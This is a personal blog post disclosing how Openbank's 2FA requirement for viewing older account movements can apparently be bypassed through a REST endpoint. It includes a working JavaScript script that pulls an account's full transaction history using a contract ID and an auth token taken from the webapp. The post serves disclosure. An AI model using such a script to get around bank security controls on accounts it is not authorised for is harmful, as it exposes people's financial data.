# Openbank's useless 2FA for checking the full movements history

> December 27 2024
<br/>
Hey, this is a brief analysis I have done over [Openbank (Spain)](https://www.openbank.es/).

\
**Openbank** has a 2FA system for certain actions in their app and webapp, this includes checking the full history of movements, even if you are already logged in.
\
Here is the [route](https://clientes.openbank.es/myprofile/accounts/0000000/movements) of the webapp where you can see movements of an account. Replace the zeros with an account id in case you want to try it.
\
By default it only displays movements up to around 3 months ago, if you want to see older movements you need to click on the **See More movements** button, which prompts the following popup (translated from Spanish):
<br/>
<div class="flex justify-center items-center">
    <img src="/openbank_2fa_popup.png" alt="Openbank useless 2fa" align="middle" />
</div>
\
The issue is that this extra security requirement is basically **useless** because there is an endpoint from their REST API that we can use to literally query all the transactions from the day the account was created.
\
I made the following script in JavaScript that uses the mentioned endpoint.
\
You can get your `<CONTRACT_ID>` by digging a bit in the app or webapp, and you can get the `<AUTH_TOKEN>` by inspecting some of the requests sent by the webapp.
<br/>

```ts
async function get() {
    let data = []
    const categories = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14];

    const contracts = ["<CONTRACT_ID>"] // You can put multiple contracts if you want
    const authToken = `<AUTH_TOKEN>`;
    await Promise.all(categories.map(async (code) => {
        const res = await fetch("https://api.openbank.es/categorized-transactions/listbycategorycontracts ", {
            "credentials": "omit",
            "headers": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.5",
                "Content-Type": "application/json",
                "version": "2",
                "openBankAuthToken": authToken,
                "Sec-GPC": "1",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "Pragma": "no-cache",
                "Cache-Control": "no-cache"
            },
            "referrer": "https:clientes.openbank.es/",
            "body": JSON.stringify({
                temporalGrouping: "Y",
                contracts,
                from: "1234-01-23", // LOL
                to: "2222-11-22",   // still far away
                categoryCode: code,
                banks: null
            }),
            "method": "POST",
            "mode": "cors"
        });
        const json = await res.json(); 
        data = [
            ...data,
            ...json
        ]
    }));

    return 
        data.map(tx => ({
            date: new Date(tx.fecha),
            title: tx.concept,
            amount: tx.monto
        }))
        .sort((a, b) => a.date - b.date).reverse();
}

const formatter = new Intl.DateTimeFormat('en-US', { day: "numeric", month: "long" });

for(const tx of await get()) {
    console.log(`${formatter.format(tx.date)}      ${tx.title}     ${tx.amount}`);
}
```
\
By running this script **I am able to see what it seems to be the whole movements history from the day I created my account.**
\
Random example of a log I can see from some years ago:
<br/>
<div class="flex justify-center items-center">
    <img src="/openbank_2fa_tx_example.png" alt="Openbank useless 2fa tx example" align="middle" />
</div>
<br/>
> Note: I used Deno to run the script but you can use other runtimes or even a browser as long as you are in the openbank website.
<br/>

But here is more to this story, the endpoint used in the script is used in another [route](https://clientes.openbank.es/myprofile/global/expenses-by-category/) of the webapp.
\
This other route allows us to see the movements up to **1 year ago with no extra steps**, though it will get angry at you if you try an older date.
<br/>
<div class="flex justify-center items-center">
    <img src="/openbank_2fa_minimum_date.png" alt="Openbank useless 2fa minimum date" align="middle" />
</div>
\
But that's the UI, because in the other hand, the **REST endpoint does not care about minimum dates or extra security requirements**.
\
Something I also noticed is that some endpoints and their parameters, are written in English and others in Spanish, perhaps a lack of coordination between teams lead to this.
\
I think this issue is kinda dumb but at the same time if you think about... they think they have a security feature, but it doesn't really secure anything, does it? What if other things are also not working as expected?
\
Btw, I already tried to contact **Openbank** multiple times privately, I never really got an answer regarding the issue, but rather all I got was "Send it to this other X email" or "Thanks for contacting us, we will answer asap!".
Last message I got was an automated response on December 2nd. It seems they can't afford to have a decent technical support.
\
Idk, perhaps I am just missing something... Time will tell I guess!
